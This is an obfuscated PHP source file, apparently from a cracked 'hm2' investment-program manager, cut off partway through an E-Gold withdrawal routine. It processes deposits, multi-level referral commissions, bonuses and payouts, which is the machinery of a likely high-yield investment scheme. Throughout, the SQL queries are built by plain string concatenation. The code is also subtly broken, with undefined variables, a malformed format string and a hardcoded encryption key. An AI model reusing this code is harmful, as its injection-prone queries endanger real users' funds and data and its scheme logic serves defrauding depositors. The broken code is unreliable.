<?
/*****************************************************/
/*                                                    */
/*  Este archivo fue creado por RedControl            */
/*                                                    */
/*                                                    */
/*    Version:      2010                              */
/*    Author:       www.redcontrol.com.ar             */
/*    Release on:   2010.01.18                        */
/*                                                    */
/******************************************************/


  function elnlcjcnp ($elnlcgpSU)
  {
    $elnlcwpyy = array ();
    if (preg_match ('/\\[default\\](.*?)\\[\\/default\\]/', $elnlcgpSU, $elnlcwpyy))
    {
      $elnlcgpSU = $elnlcwpyy[1];
    }

    return $elnlcgpSU;
  }

  function elnlcqjmoo ($elnlcgpSU, $elnlcrsPJ, $d)
  {
    global $elnlcMVquv;
    $elnlcGryvK = ($elnlcgpSU + 48273) % $elnlcrsPJ;
    $elnlcxLrC = $elnlcMVquv['elnlcvCqE'];
    $elnlclTaO = $elnlcGryvK;
    while ($elnlcxLrC == 0)
    {
      if ($d[$elnlcGryvK] != -1)
      {
        ++$elnlcGryvK;
        if ($elnlcGryvK == $elnlcrsPJ)
        {
          $elnlcGryvK = $elnlcMVquv['elnlcvCqE'];
          continue;
        }

        continue;
      }

      $elnlcxLrC = $elnlcMVquv['elnlczUlK'];
    }

    return $elnlcGryvK;
  }

  function elnlcmpia ($elnlcgpSU, $elnlcrsPJ, $d)
  {
    global $elnlcMVquv;
    $elnlcGryvK = ($elnlcgpSU + 48273) % $elnlcrsPJ;
    $elnlcxLrC = $elnlcMVquv['elnlcvCqE'];
    while (!$elnlcxLrC)
    {
      if ($d[$elnlcGryvK] == -1)
      {
        ++$elnlcGryvK;
        if ($elnlcGryvK == $elnlcrsPJ)
        {
          $elnlcGryvK = $elnlcMVquv['elnlcvCqE'];
          continue;
        }

        continue;
      }

      $elnlcxLrC = $elnlcMVquv['elnlczUlK'];
    }

    return $elnlcGryvK;
  }

  function elnlcgoai ()
  {
    global $elnlcMVquv;
    if (!defined ('THE_GC_SCRIPT_V2005_04_01'))
    {
      print 'Please use only original script';
      exit ();
    }

    global $elnlcvflv;
    global $elnlcpvEj;
    $q = 'select * from hm2_users where id = 1';
    ($elnlcOsDxl = mysql_query ($q) OR print mysql_error ());
    $elnlcHGOr = array ();
    while ($elnlcweaeO = mysql_fetch_array ($elnlcOsDxl))
    {
      $elnlcHGOr = array ();
      $z = elnlcbrqju ($elnlcweaeO[$elnlcMVquv['elnlckOyU']], '&hd,mnf(fska$d3jlkfsda' . $elnlcpvEj[$elnlcMVquv['elnlcpNBsd']]);
      $elnlcHGOr = unserialize ($z);
    }

    return $elnlcHGOr;
  }

  function elnlckdbh ()
  {
    global $elnlcMVquv;
    if (!defined ('THE_GC_SCRIPT_V2005_04_01'))
    {
      print 'Please use only original script';
      exit ();
    }

    global $elnlcvflv;
    global $elnlcqzwiS;
    global $elnlcpvEj;
    $z = elnlckjnjt (elnlckjyru (serialize ($elnlcqzwiS), '&hd,mnf(fska$d3jlkfsda' . $elnlcpvEj[$elnlcMVquv['elnlcpNBsd']]));
    $q = '' . 'update hm2_users set ac = \'' . $z . '\' where id = 1';
    (mysql_query ($q) OR print mysql_error ());
  }

  function elnlccdokr ($elnlcJABR, $elnlcMKibB, $elnlcusGj, $elnlcoJlsg, $elnlcpGcN, $elnlcafCs, $elnlcJgboW)
  {
    global $elnlcMVquv;
    global $elnlcpvEj;
    global $elnlcBQTfP;
    $elnlcJgboW = intval ($elnlcJgboW);
    $elnlcafCs = intval ($elnlcafCs);
    $elnlcMKibB = intval ($elnlcMKibB);
    $elnlcusGj = sprintf ('%.02f', $elnlcusGj);
    $elnlcawexW = elnlckjnjt ($elnlcoJlsg);
    $elnlcCbGJF = $elnlcMVquv['elnlcvCqE'];
    $q = '' . 'select count(id) as cnt from hm2_history where ec = ' . $elnlcJABR . ' && type = \'add_funds\' && description like \'%Batch id = ' . $elnlcawexW . '\'';
    $elnlcOsDxl = mysql_query ($q);
    $elnlcweaeO = mysql_fetch_array ($elnlcOsDxl);
    if (0 < $elnlcweaeO[$elnlcMVquv['elnlcGqPM']])
    {
      $elnlcCbGJF = $elnlcMVquv['elnlczUlK'];
    }

    if ($elnlcCbGJF == 1)
    {
      return 0;
    }

    $elnlcbCWa = 'Add funds to account from ' . $elnlcBQTfP[$elnlcJABR][$elnlcMVquv['elnlcMCqpV']] . ('' . '. Batch id = ' . $elnlcoJlsg);
    if (($elnlcJABR == 4 AND $elnlcpvEj[$elnlcMVquv['elnlcnsVSg']] == 1))
    {
      $elnlcbCWa = 'Add funds to account from ' . $elnlcBQTfP[$elnlcJABR][$elnlcMVquv['elnlcMCqpV']] . ('' . ' ' . $elnlcusGj . ' - StormPay Fee. Batch id = ' . $elnlcoJlsg);
      $elnlcusGj = $elnlcusGj - $elnlcusGj * 6.90000000000000035527137 / 100 - 0.689999999999999946709295;
    }
    else
    {
      if (($elnlcJABR == 4 AND $elnlcpvEj[$elnlcMVquv['elnlcJPsaC']] == 1))
      {
        $elnlcbCWa = 'Add funds to account from ' . $elnlcBQTfP[$elnlcJABR][$elnlcMVquv['elnlcMCqpV']] . ('' . ' ' . $elnlcusGj . ' - StormPay Fee. Batch id = ' . $elnlcoJlsg);
        $elnlcusGj = $elnlcusGj - $elnlcusGj * 2.89999999999999991118216 / 100 - 0.390000000000000013322676;
      }
    }

    if (0 < $elnlcpvEj[$elnlcMVquv['elnlcVgSb']])
    {
      $elnlcDtlO = sprintf ('%0.2', $elnlcusGj * $elnlcpvEj[$elnlcMVquv['elnlcVgSb']] / 100);
      if ($elnlcDtlO < $elnlcpvEj[$elnlcMVquv['elnlcuhkuL']])
      {
        $elnlcDtlO = $elnlcpvEj[$elnlcMVquv['elnlcuhkuL']];
      }

      $elnlcusGj = $elnlcusGj - $elnlcDtlO;
      $elnlcbCWa .= '' . '. Deposit fee - ' . $elnlcDtlO;
    }

    if ($elnlcpvEj[$elnlcMVquv['elnlcaLrGO']] == $elnlcMVquv['elnlcJgeH'])
    {
      $elnlcJABR = $elnlcMVquv['elnlcgegp'];
    }

    $q = '' . 'insert into hm2_history set 
        	user_id = ' . $elnlcMKibB . ',
        	amount = \'' . $elnlcusGj . '\',
        	type = \'add_funds\',
        	description = \'' . $elnlcbCWa . '\',
        	actual_amount = ' . $elnlcusGj . ',
        	ec = ' . $elnlcJABR . ',
        	date = now()    
        	';
    (mysql_query ($q) OR print mysql_error ());
    $q = '' . 'select * from hm2_types where id = ' . $elnlcafCs;
    ($elnlcOsDxl = mysql_query ($q) OR print mysql_error ());
    $elnlcjyhb = '';
    $elnlclgPlI = mysql_fetch_array ($elnlcOsDxl);
    $elnlcihWzS = -1;
    if ($elnlclgPlI)
    {
      $elnlcihWzS += $elnlcweaeO[$elnlcMVquv['elnlchfQPl']];
      $elnlcjyhb = elnlckjnjt ($elnlclgPlI[$elnlcMVquv['elnlcMCqpV']]);
      if ($elnlclgPlI[$elnlcMVquv['elnlcrBwT']] == 0)
      {
        $elnlcJgboW = $elnlcMVquv['elnlcvCqE'];
      }
      else
      {
        if ($elnlclgPlI[$elnlcMVquv['elnlcRvKp']] == 0)
        {
          $elnlclgPlI[$elnlcMVquv['elnlcRvKp']] = $elnlcusGj + 1;
        }

        if (($elnlclgPlI[$elnlcMVquv['elnlcSUgEI']] <= $elnlcusGj AND $elnlcusGj <= $elnlclgPlI[$elnlcMVquv['elnlcRvKp']]))
        {
          if ($elnlclgPlI[$elnlcMVquv['elnlcpEow']] == 1)
          {
            $elnlcGRIUs = preg_split ('/\\s*,\\s*/', $elnlclgPlI[$elnlcMVquv['elnlcGrJhm']]);
            if (!in_array ($elnlcJgboW, $elnlcGRIUs))
            {
              $elnlcJgboW = $elnlcGRIUs[0];
            }
          }
          else
          {
            if ($elnlcJgboW < $elnlclgPlI[$elnlcMVquv['elnlcbKUSb']])
            {
              $elnlcJgboW = $elnlclgPlI[$elnlcMVquv['elnlcbKUSb']];
            }

            if ($elnlclgPlI[$elnlcMVquv['elnlcqOjLh']] < $elnlcJgboW)
            {
              $elnlcJgboW = $elnlclgPlI[$elnlcMVquv['elnlcqOjLh']];
            }
          }
        }
        else
        {
          $elnlcJgboW = $elnlcMVquv['elnlcvCqE'];
        }
      }
    }

    if ($elnlcihWzS < 0)
    {
      $elnlcihWzS = $elnlcMVquv['elnlcvCqE'];
    }

    $q = '' . 'select min(hm2_plans.min_deposit) as min, max(if(hm2_plans.max_deposit = 0, 999999999999, hm2_plans.max_deposit)) as max from hm2_types left outer join hm2_plans on hm2_types.id = hm2_plans.parent where hm2_types.id = ' . $elnlcafCs;
    $elnlctngR = mysql_query ($q);
    $elnlcCSJwr = mysql_fetch_array ($elnlctngR);
    $elnlcNbApb = $elnlcCSJwr[$elnlcMVquv['elnlcabhiD']];
    $elnlcLFqD = $elnlcCSJwr[$elnlcMVquv['elnlcdmgJ']];
    if (($elnlcNbApb <= $elnlcusGj AND $elnlcusGj <= $elnlcLFqD))
    {
      $q = '' . 'insert into hm2_deposits set
          	user_id = ' . $elnlcMKibB . ',
          	type_id = ' . $elnlcafCs . ',
          	deposit_date = now(),
          	last_pay_date = now()+ interval ' . $elnlcihWzS . ' day,
          	status = \'on\',
          	q_pays = 0,
          	amount = \'' . $elnlcusGj . '\',
          	actual_amount = \'' . $elnlcusGj . '\',
          	ec = ' . $elnlcJABR . ',
          	compound = ' . $elnlcJgboW . '
          	';
      (mysql_query ($q) OR print mysql_error ());
      $elnlcbooUx = mysql_insert_id ();
      $q = '' . 'insert into hm2_history set 
          	user_id = ' . $elnlcMKibB . ',
          	amount = \'-' . $elnlcusGj . '\',
          	type = \'deposit\',
          	description = \'Deposit to ' . elnlckjnjt ($elnlcjyhb) . ('' . '\',
          	actual_amount = -' . $elnlcusGj . ',
          	ec = ' . $elnlcJABR . ',
          	date = now(),
                deposit_id = ' . $elnlcbooUx . '
          	');
      (mysql_query ($q) OR print mysql_error ());
      if ($elnlcpvEj[$elnlcMVquv['elnlcaLrGO']] == $elnlcMVquv['elnlcTMDJn'])
      {
        $q = '' . 'update hm2_users set reset = 0 where id = ' . $elnlcEifF[$elnlcMVquv['elnlcEAKA']];
        mysql_query ($q);
      }

      if ($elnlcpvEj[$elnlcMVquv['elnlcaLrGO']] == $elnlcMVquv['elnlcodxfg'])
      {
        $q = '' . 'select count(id) as col from hm2_deposits where user_id = ' . $elnlcMKibB;
        ($elnlcOsDxl = mysql_query ($q) OR print mysql_error ());
        $elnlcqmGUg = $elnlcMVquv['elnlcvCqE'];
        while ($elnlcweaeO = mysql_fetch_array ($elnlcOsDxl))
        {
          $elnlcqmGUg = $elnlcweaeO[$elnlcMVquv['elnlcxwjRE']];
        }

        $q = 'select count(distinct user_id) as col from hm2_deposits';
        ($elnlcOsDxl = mysql_query ($q) OR print mysql_error ());
        $elnlcDMQpE = $elnlcMVquv['elnlcEaRO'];
        while ($elnlcweaeO = mysql_fetch_array ($elnlcOsDxl))
        {
          $elnlcDMQpE = $elnlcweaeO[$elnlcMVquv['elnlcxwjRE']];
        }

        if (($elnlcqmGUg == 1 AND $elnlcDMQpE <= 500))
        {
          $q = '' . 'insert into hm2_history set
  	user_id = ' . $elnlcMKibB . ',
  	amount = 2,
  	type = \'bonus\',
  	description = \'Bonus\',
  	actual_amount = 2,
  	ec = ' . $elnlcJABR . ',
  	date = now()';
          (mysql_query ($q) OR print mysql_error ());
        }
      }

      if ($elnlcpvEj[$elnlcMVquv['elnlcPxRax']] == 1)
      {
        $elnlcqKzkT = $elnlcMVquv['elnlcvCqE'];
        if (0 < $elnlcpvEj[$elnlcMVquv['elnlciRWLp']])
        {
          $elnlcqKzkT = $elnlcusGj * 1000 / $elnlcpvEj[$elnlcMVquv['elnlciRWLp']];
        }

        if (0 < $elnlcqKzkT)
        {
          $q = '' . 'update hm2_users set imps = imps + ' . $elnlcqKzkT . ' where id = ' . $elnlcMKibB;
          (mysql_query ($q) OR print mysql_error ());
        }
      }

      $elnlccKzMq = elnlcdfun ($elnlcMKibB, $elnlcusGj, $elnlcJABR);
    }
    else
    {
      $elnlcjyhb = 'Deposit to Account';
    }

    $q = '' . 'select * from hm2_users where id = ' . $elnlcMKibB;
    $elnlcOsDxl = mysql_query ($q);
    $elnlcgKTMb = mysql_fetch_array ($elnlcOsDxl);
    $elnlcRhpt = array ($elnlcgKTMb);
    $elnlcRhpt[$elnlcMVquv['elnlcRzkgp']] = $elnlcgKTMb[$elnlcMVquv['elnlcRzkgp']];
    $elnlcRhpt[$elnlcMVquv['elnlcMCqpV']] = $elnlcgKTMb[$elnlcMVquv['elnlcMCqpV']];
    $elnlcRhpt[$elnlcMVquv['elnlcGRxou']] = number_format ($elnlcusGj, 2);
    $elnlcRhpt[$elnlcMVquv['elnlcEmcBS']] = $elnlcpGcN;
    $elnlcRhpt[$elnlcMVquv['elnlcwBFz']] = $elnlcBQTfP[$elnlcJABR][$elnlcMVquv['elnlcMCqpV']];
    $elnlcRhpt[$elnlcMVquv['elnlcNvcv']] = $elnlcoJlsg;
    $elnlcRhpt[$elnlcMVquv['elnlcokxs']] = $elnlcJgboW;
    $elnlcRhpt[$elnlcMVquv['elnlcQhmQ']] = elnlcjcnp ($elnlcjyhb);
    $elnlcRhpt[$elnlcMVquv['elnlcmqMTA']] = $elnlccKzMq;
    $elnlcRhpt[$elnlcMVquv['elnlcBeqd']] = '[no upline]';
    if (0 < $elnlcgKTMb[$elnlcMVquv['elnlcwITI']])
    {
      $q = '' . 'select * from hm2_users where id = ' . $elnlcgKTMb[$elnlcMVquv['elnlcwITI']];
      ($elnlcOsDxl = mysql_query ($q) OR print mysql_error ());
      while ($elnlcweaeO = mysql_fetch_array ($elnlcOsDxl))
      {
        $elnlcRhpt[$elnlcMVquv['elnlcBeqd']] = $elnlcweaeO[$elnlcMVquv['elnlcRzkgp']];
      }
    }

    $q = 'select email from hm2_users where id = 1';
    $elnlcOsDxl = mysql_query ($q);
    $elnlcsPxe = '';
    while ($elnlcweaeO = mysql_fetch_array ($elnlcOsDxl))
    {
      $elnlcsPxe = $elnlcweaeO[$elnlcMVquv['elnlcjqxSK']];
    }

    elnlcvgfng ('deposit_admin_notification', $elnlcsPxe, $elnlcpvEj[$elnlcMVquv['elnlcWIVix']], $elnlcRhpt);
    elnlcvgfng ('deposit_user_notification', $elnlcgKTMb[email], $elnlcpvEj[$elnlcMVquv['elnlcWIVix']], $elnlcRhpt);
    return 1;
  }

  function elnlcdfun ($elnlcMKibB, $elnlcusGj, $elnlcJABR)
  {
    global $elnlcMVquv;
    global $elnlcpvEj;
    global $elnlcBQTfP;
    $q = '' . 'select * from hm2_users where id = ' . $elnlcMKibB;
    $elnlcFicbK = mysql_query ($q);
    $elnlcRHshn = mysql_fetch_array ($elnlcFicbK);
    if ($elnlcpvEj[$elnlcMVquv['elnlcaLrGO']] == $elnlcMVquv['elnlcJgeH'])
    {
      $elnlcPGVET = $elnlckjaca[$elnlcMVquv['elnlcwITI']];
      $q = '' . 'select count(id) as cnt from hm2_deposits where user_id = ' . $elnlcPGVET;
      $elnlcOsDxl = mysql_query ($q);
      $elnlcweaeO = mysql_fetch_array ($elnlcOsDxl);
      if ($elnlcweaeO[$elnlcMVquv['elnlcGqPM']] <= 0)
      {
        return 0;
      }

      $q = '' . 'select sum(actual_amount) as amnt from hm2_deposits as d, hm2_users as u where d.user_id = u.id and d.status = \'on\' and u.ref = ' . $elnlcPGVET;
      $elnlcOsDxl = mysql_query ($q);
      $elnlcweaeO = mysql_fetch_array ($elnlcOsDxl);
      if ($elnlcweaeO[$elnlcMVquv['elnlcNepQ']] < 3000)
      {
        $elnlcISOHc = $elnlcMVquv['elnlcvCqE'];
        return 0;
      }
      else
      {
        if ($elnlcweaeO[$elnlcMVquv['elnlcNepQ']] < 6000)
        {
          $elnlcISOHc = 0.0200000000000000004163336;
        }
        else
        {
          if ($elnlcweaeO[$elnlcMVquv['elnlcNepQ']] < 12000)
          {
            $elnlcISOHc = 0.0500000000000000027755576;
          }
          else
          {
            $elnlcISOHc = 0.100000000000000005551115;
          }
        }
      }

      $elnlcOBzje = $elnlcusGj * $elnlcISOHc;
      $q = '' . 'insert into hm2_history set
      	user_id = ' . $elnlcPGVET . ',
      	amount = ' . $elnlcOBzje . ',
      	actual_amount = ' . $elnlcOBzje . ',
      	type = \'commissions\',
      	description = \'Referral commission from ' . elnlckjnjt ($elnlcRHshn[$elnlcMVquv['elnlcRzkgp']]) . ('' . '\',
      	ec = ' . $elnlcJABR . ',
      	date = now()');
      (mysql_query ($q) OR print mysql_error ());
      $q = '' . 'select * from hm2_users where id = ' . $elnlcPGVET;
      $elnlcFicbK = mysql_query ($q);
      $elnlcUodH = mysql_fetch_array ($elnlcFicbK);
      $elnlcUodH[$elnlcMVquv['elnlcGRxou']] = number_format ($elnlcOBzje, 2);
      $elnlcUodH[$elnlcMVquv['elnlcRBBfn']] = $elnlcRHshn[$elnlcMVquv['elnlcRzkgp']];
      $elnlcUodH[$elnlcMVquv['elnlczVclz']] = $elnlcRHshn[$elnlcMVquv['elnlcMCqpV']];
      $elnlcUodH[$elnlcMVquv['elnlcwBFz']] = $elnlcBQTfP[$elnlcJABR][$elnlcMVquv['elnlcMCqpV']];
      elnlcvgfng ('referral_commision_notification', $elnlcUodH[$elnlcMVquv['elnlcjqxSK']], $elnlcpvEj[$elnlcMVquv['elnlcWIVix']], $elnlcUodH);
    }

    $elnlccKzMq = $elnlcMVquv['elnlcvCqE'];
    if ($elnlcpvEj[$elnlcMVquv['elnlcNiVlr']] == 1)
    {
      $elnlcPGVET = $elnlcMVquv['elnlcvCqE'];
      if (0 < $elnlcRHshn[$elnlcMVquv['elnlcwITI']])
      {
        $elnlcPGVET = $elnlcRHshn[$elnlcMVquv['elnlcwITI']];
      }
      else
      {
        return 0;
      }

      if ($elnlcpvEj[$elnlcMVquv['elnlcIpJsG']])
      {
        $q = '' . 'select count(id) as cnt from hm2_deposits where user_id = ' . $elnlcPGVET;
        $elnlcOsDxl = mysql_query ($q);
        $elnlcweaeO = mysql_fetch_array ($elnlcOsDxl);
        if ($elnlcweaeO[$elnlcMVquv['elnlcGqPM']] <= 0)
        {
          return 0;
        }
      }

      if ((0 < $elnlcpvEj[$elnlcMVquv['elnlcKdnEa']] AND $elnlcusGj < $elnlcpvEj[$elnlcMVquv['elnlcKdnEa']]))
      {
        return 0;
      }

      if ($elnlcpvEj[$elnlcMVquv['elnlcawOz']] == 1)
      {
        if (0 < $elnlcpvEj[$elnlcMVquv['elnlcUFQKK']])
        {
          $q = '' . 'select count(id) as cnt from hm2_deposits where user_id = ' . $elnlcMKibB;
          $elnlcOsDxl = mysql_query ($q);
          $elnlcweaeO = mysql_fetch_array ($elnlcOsDxl);
          if ($elnlcweaeO[$elnlcMVquv['elnlcGqPM']] == 1)
          {
            $elnlcOBzje = $elnlcpvEj[$elnlcMVquv['elnlcUFQKK']];
            $elnlccKzMq += $elnlcOBzje;
            $q = '' . 'insert into hm2_history set
    		user_id = ' . $elnlcPGVET . ',
    		amount = ' . $elnlcOBzje . ',
    		actual_amount = ' . $elnlcOBzje . ',
    		type = \'commissions\',
    		description = \'Referral commission from ' . elnlckjnjt ($elnlcRHshn[$elnlcMVquv['elnlcRzkgp']]) . ('' . '\',
    		ec = ' . $elnlcJABR . ',
    		date = now()');
            (mysql_query ($q) OR print mysql_error ());
            $q = '' . 'select * from hm2_users where id = ' . $elnlcPGVET;
            $elnlcFicbK = mysql_query ($q);
            $elnlcUodH = mysql_fetch_array ($elnlcFicbK);
            $elnlcUodH[$elnlcMVquv['elnlcGRxou']] = number_format ($elnlcOBzje, 2);
            $elnlcUodH[$elnlcMVquv['elnlcRBBfn']] = $elnlcRHshn[$elnlcMVquv['elnlcRzkgp']];
            $elnlcUodH[$elnlcMVquv['elnlczVclz']] = $elnlcRHshn[$elnlcMVquv['elnlcMCqpV']];
            $elnlcUodH[$elnlcMVquv['elnlcwBFz']] = $elnlcBQTfP[$elnlcJABR][$elnlcMVquv['elnlcMCqpV']];
            elnlcvgfng ('referral_commision_notification', $elnlcUodH[$elnlcMVquv['elnlcjqxSK']], $elnlcpvEj[$elnlcMVquv['elnlcWIVix']], $elnlcUodH);
          }
        }
      }
      else
      {
        if ($elnlcpvEj[$elnlcMVquv['elnlcLfkS']] == 1)
        {
          $q = '' . 'select count(distinct user_id) as col from hm2_users, hm2_deposits where ref = ' . $elnlcPGVET . ' and hm2_deposits.user_id = hm2_users.id';
        }
        else
        {
          $q = '' . 'select count(id) as col from hm2_users where ref = ' . $elnlcPGVET;
        }

        $elnlcOsDxl = mysql_query ($q);
        if ($elnlcweaeO = mysql_fetch_array ($elnlcOsDxl))
        {
          $elnlcKJUve = $elnlcweaeO[$elnlcMVquv['elnlcxwjRE']];
          $q = '' . 'select * from hm2_users where id = ' . $elnlcPGVET;
          $elnlcFicbK = mysql_query ($q);
          $elnlcBjOmL = mysql_fetch_array ($elnlcFicbK);
          $elnlcClDNb = @unserialize ($elnlcBjOmL[$elnlcMVquv['elnlcgMRG']]);
          if (isset ($elnlcClDNb[$elnlcMVquv['elnlcyCdR']]))
          {
            $j = $elnlcMVquv['elnlczUlK'];
            while (isset ($elnlcClDNb['ref_percent' . $j]))
            {
              if (($elnlcClDNb['ref_percent' . $j][0] <= $elnlcKJUve AND $elnlcKJUve <= $elnlcClDNb['ref_percent' . $j][1]))
              {
                $elnlcOBzje = $elnlcusGj * $elnlcClDNb['ref_percent' . $j][2] / 100;
                $elnlccKzMq += $elnlcOBzje;
                break;
              }

              ++$j;
            }
          }
          else
          {
            if ($elnlcpvEj[$elnlcMVquv['elnlcaLrGO']] == $elnlcMVquv['elnlcftOTz'])
            {
              $q = '' . 'select sum(amount) as amnt from hm2_deposits where user_id = ' . $elnlcPGVET;
              $elnlcOsDxl = mysql_query ($q);
              $elnlcweaeO = mysql_fetch_array ($elnlcOsDxl);
              $elnlcISOHc = $elnlcMVquv['elnlcvCqE'];
              if (10000 <= $elnlcweaeO[$elnlcMVquv['elnlcNepQ']])
              {
                $elnlcISOHc = $elnlcMVquv['elnlcqMwqC'];
              }
              else
              {
                if (5000 <= $elnlcweaeO[$elnlcMVquv['elnlcNepQ']])
                {
                  $elnlcISOHc = $elnlcMVquv['elnlcgipk'];
                }
                else
                {
                  if (3000 <= $elnlcweaeO[$elnlcMVquv['elnlcNepQ']])
                  {
                    $elnlcISOHc = $elnlcMVquv['elnlcxJEF'];
                  }
                  else
                  {
                    if (1000 <= $elnlcweaeO[$elnlcMVquv['elnlcNepQ']])
                    {
                      $elnlcISOHc = $elnlcMVquv['elnlcQqGFV'];
                    }
                  }
                }
              }

              if (0 < $elnlcISOHc)
              {
                if (4 <= $elnlcKJUve)
                {
                  $elnlcISOHc += 3;
                }

                $elnlcOBzje = $elnlcusGj * $elnlcISOHc / 100;
                $elnlccKzMq += $elnlcOBzje;
                $q = '' . 'insert into hm2_history set
    		user_id = ' . $elnlcPGVET . ',
    		amount = ' . $elnlcOBzje . ',
    		actual_amount = ' . $elnlcOBzje . ',
    		type = \'commissions\',
    		description = \'Referral commission from ' . elnlckjnjt ($elnlcRHshn[$elnlcMVquv['elnlcRzkgp']]) . ('' . '\',
    		ec = ' . $elnlcJABR . ',
     		date = now()');
                (mysql_query ($q) OR print mysql_error ());
              }
            }
            else
            {
              $q = '' . 'select percent from hm2_referal where from_value <= ' . $elnlcKJUve . ' and (to_value >= ' . $elnlcKJUve . ' or to_value = 0) order by from_value desc limit 1';
              ($elnlcOsDxl = mysql_query ($q) OR print mysql_error ());
              if ($elnlcweaeO = mysql_fetch_array ($elnlcOsDxl))
              {
                $elnlcOBzje = $elnlcusGj * $elnlcweaeO[$elnlcMVquv['elnlcHlxD']] / 100;
                $elnlccKzMq += $elnlcOBzje;
                $q = '' . 'insert into hm2_history set
    		user_id = ' . $elnlcPGVET . ',
    		amount = ' . $elnlcOBzje . ',
    		actual_amount = ' . $elnlcOBzje . ',
    		type = \'commissions\',
    		description = \'Referral commission from ' . elnlckjnjt ($elnlcRHshn[$elnlcMVquv['elnlcRzkgp']]) . ('' . '\',
    		ec = ' . $elnlcJABR . ',
     		date = now()');
                (mysql_query ($q) OR print mysql_error ());
              }
            }
          }

          $q = '' . 'select * from hm2_users where id = ' . $elnlcPGVET;
          $elnlcFicbK = mysql_query ($q);
          $elnlcUodH = mysql_fetch_array ($elnlcFicbK);
          $elnlcUodH[$elnlcMVquv['elnlcGRxou']] = number_format ($elnlcOBzje, 2);
          $elnlcUodH[$elnlcMVquv['elnlcRBBfn']] = $elnlcRHshn[$elnlcMVquv['elnlcRzkgp']];
          $elnlcUodH[$elnlcMVquv['elnlczVclz']] = $elnlcRHshn[$elnlcMVquv['elnlcMCqpV']];
          $elnlcUodH[$elnlcMVquv['elnlcwBFz']] = $elnlcBQTfP[$elnlcJABR][$elnlcMVquv['elnlcMCqpV']];
          elnlcvgfng ('referral_commision_notification', $elnlcUodH[$elnlcMVquv['elnlcjqxSK']], $elnlcpvEj[$elnlcMVquv['elnlcWIVix']], $elnlcUodH);
        }
      }

      if ($elnlcpvEj[$elnlcMVquv['elnlcawOz']] != 1)
      {
        for ($i = $elnlcMVquv['elnlctwRR']; $i < 11; ++$i)
        {
          if (($elnlcPGVET == 0 OR $elnlcpvEj['ref' . $i . '_cms'] == 0))
          {
            break;
          }

          if ((0 < $elnlcpvEj['ref' . $i . '_cms_minamount'] AND $elnlcusGj < $elnlcpvEj['ref' . $i . '_cms_minamount']))
          {
            continue;
          }

          $q = '' . 'select * from hm2_users where id = ' . $elnlcPGVET;
          $elnlcOsDxl = mysql_query ($q);
          $elnlcPGVET = $elnlcMVquv['elnlcvCqE'];
          while ($elnlcweaeO = mysql_fetch_array ($elnlcOsDxl))
          {
            $elnlcPGVET = $elnlcweaeO[$elnlcMVquv['elnlcwITI']];
            if (0 < $elnlcPGVET)
            {
              $elnlcSuyJh = $elnlcMVquv['elnlczUlK'];
              if ($elnlcpvEj[$elnlcMVquv['elnlcIpJsG']] == 1)
              {
                $elnlcSuyJh = $elnlcMVquv['elnlcvCqE'];
                $q = '' . 'select count(id) as cnt from hm2_deposits where user_id = ' . $elnlcPGVET;
                $elnlcEDKo = mysql_query ($q);
                $elnlccItm = mysql_fetch_array ($elnlcEDKo);
                if (0 < $elnlccItm[$elnlcMVquv['elnlcGqPM']])
                {
                  $elnlcSuyJh = $elnlcMVquv['elnlczUlK'];
                }
              }

              if ($elnlcSuyJh == 1)
              {
                $elnlcOBzje = $elnlcusGj * $elnlcpvEj['ref' . $i . '_cms'] / 100;
                $elnlccKzMq += $elnlcOBzje;
                $q = 'insert into hm2_history set
                  user_id = ' . $elnlcweaeO[$elnlcMVquv['elnlcwITI']] . ('' . ',
                  amount = ' . $elnlcOBzje . ',
                  actual_amount = ' . $elnlcOBzje . ',
                  type = \'commissions\',
                  description = \'Referral commission from ') . elnlckjnjt ($elnlcRHshn[$elnlcMVquv['elnlcRzkgp']]) . ('' . ' ' . $i . ' level referral\',
                  ec = ' . $elnlcJABR . ',
                  date = now()');
                (mysql_query ($q) OR print mysql_error ());
                continue;
              }

              continue;
            }
          }
        }
      }
    }

    return $elnlccKzMq;
  }

  function elnlcoaka ($elnlcpGcN, $elnlcJABR)
  {
    global $elnlcMVquv;
    global $elnlcBQTfP;
    $elnlcJABR = intval ($elnlcJABR);
    $elnlcpGcN = elnlckjnjt ($elnlcpGcN);
    $q = '' . 'select count(*) as cnt from hm2_pay_settings where n=\'ext_accounts_blacklist\' and v=\'' . $elnlcJABR . '=' . $elnlcpGcN . '\'';
    $elnlcOsDxl = mysql_query ($q);
    $elnlcweaeO = mysql_fetch_assoc ($elnlcOsDxl);
    if (0 < $elnlcweaeO[$elnlcMVquv['elnlcGqPM']])
    {
      return array (0, 'Blacklisted ' . $elnlcBQTfP[$elnlcJABR] . ' account ' . $elnlcpGcN);
    }

    return array (1, '');
  }

  function elnlcdrusa ($elnlcgodh, $elnlcusGj, $elnlcpGcN, $elnlcSFSSt, $elnlcvubh)
  {
    global $elnlcMVquv;
    global $elnlcpvEj;
    if ($elnlcpvEj[$elnlcMVquv['elnlcEPxH']] == $elnlcMVquv['elnlcvPEr'])
    {
      return array (1, '[transaction in demo mode]', '[transaction in demo mode]');
    }

    if ($elnlcpvEj[$elnlcMVquv['elnlczzIb']] == 1)
    {
      return array (1, '[transaction in demo mode]', '[transaction in demo mode]');
    }

    if ($elnlcpGcN == 0)
    {
      $q = 'insert into hm2_pay_errors set date = now(), txt = \'Can`t process withdrawal to E-Gold account 0.\'';
      mysql_query ($q);
      return array (0, 'Invalid E-Gold account', '');
    }

    list ($elnlcvmju, $elnlcSsmhm) = elnlcoaka ($elnlcpGcN, 0);
    if ($elnlcvmju == 0)
    {
      $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $elnlcSsmhm . '\'';
      mysql_query ($q);
      return array (0, $elnlcSsmhm);
    }

    if (function_exists ('curl_init'))
    {
      if ($elnlcgodh == '')
      {
        $q = 'select v from hm2_pay_settings where n=\'egold_account_password\'';
        $elnlcOsDxl = mysql_query ($q);
        while ($elnlcweaeO = mysql_fetch_array ($elnlcOsDxl))
        {
          $elnlcMEQmq = elnlcdxpe ($elnlcweaeO[$elnlcMVquv['elnlcCCsn']], $elnlcMVquv['elnlcQlDcy']);
        }
      }
      else
      {
        $elnlcMEQmq = $elnlcgodh;
      }

      $elnlcTQnW = curl_init ();
      $elnlcSFSSt = rawurlencode ($elnlcSFSSt);
      curl_setopt ($elnlcTQnW, CURLOPT_URL, 'https://www.e-gold.com/acct/confirm.asp');
      curl_setopt ($elnlcTQnW, CURLOPT_POST, 1);
